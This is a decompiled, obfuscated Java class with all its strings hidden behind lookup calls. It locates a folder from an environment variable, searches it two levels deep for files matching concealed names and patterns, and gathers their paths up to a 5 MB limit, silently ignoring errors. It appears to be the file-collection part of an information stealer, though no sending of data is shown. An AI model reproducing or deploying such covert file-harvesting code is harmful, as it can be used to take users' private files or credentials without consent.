/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

public final class ae {
    private static final Pattern a = Pattern.compile($S.d(801));

    public static b a() {
        try {
            Object object = System.getenv($S.d(212));
            if (object == null) {
                return null;
            }
            if (!((File)(object = new File((String)object + $S.d(662)))).exists()) {
                return null;
            }
            b b2 = new b();
            long[] lArray = new long[]{0L};
            Object object2 = object;
            ae.a((File)object2, (File)object2, 0, b2.b, lArray, 0x500000L);
            if (b2.b.isEmpty()) {
                return null;
            }
            b2.a = true;
            return b2;
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static void a(File fileArray, File file, int n2, List<a> list2, long[] lArray, long l2) {
        if (n2 > 2) {
            return;
        }
        if ((fileArray = fileArray.listFiles()) == null) {
            return;
        }
        for (File file2 : fileArray) {
            if (lArray[0] >= l2) break;
            if (file2.isFile()) {
                String string = file2.getName();
                if (!ae.a(string) || file2.length() > l2 - lArray[0]) continue;
                string = file.toPath().relativize(file2.toPath()).toString().replace("\\", "/");
                list2.add(new a(file2.getAbsolutePath(), string));
                lArray[0] = lArray[0] + file2.length();
                continue;
            }
            if (!file2.isDirectory() || n2 >= 2) continue;
            ae.a(file2, file, n2 + 1, list2, lArray, l2);
        }
    }

    private static boolean a(String string) {
        if ($S.d(797).equals(string)) {
            return true;
        }
        if (string.startsWith($S.d(798))) {
            return true;
        }
        if (string.startsWith($S.d(799))) {
            return true;
        }
        if ($S.d(800).equals(string)) {
            return true;
        }
        return a.matcher(string).matches();
    }

    public static final class b {
        public boolean a;
        public List<a> b = new ArrayList<a>();
    }

    public static final class a {
        public String a;
        public String b;

        public a(String string, String string2) {
            this.a = string;
            this.b = string2;
        }
    }
}

